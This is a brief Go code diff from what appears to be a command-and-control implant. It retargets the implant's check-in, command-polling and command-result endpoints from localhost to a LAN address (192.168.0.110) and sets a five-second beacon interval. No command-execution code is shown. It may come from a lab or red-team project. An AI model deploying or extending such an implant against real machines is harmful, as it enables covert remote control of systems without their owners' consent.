@@ -23,9 +23,9 @@ func implantID() string {
 
 const (
 	// Update this URL to the new endpoint
-	checkInURL       = "http://localhost:8080/checkin"
-	commandsURL      = "http://localhost:8080/implant-client/%s/commands" // <-- UPDATED
-	commandResultURL = "http://localhost:8080/command-result"
+	checkInURL       = "http://192.168.0.110:8080/checkin"
+	commandsURL      = "http://192.168.0.110:8080/implant-client/%s/commands" // <-- UPDATED
+	commandResultURL = "http://192.168.0.110:8080/command-result"
 	checkInInterval  = 5 * time.Second
 )
 
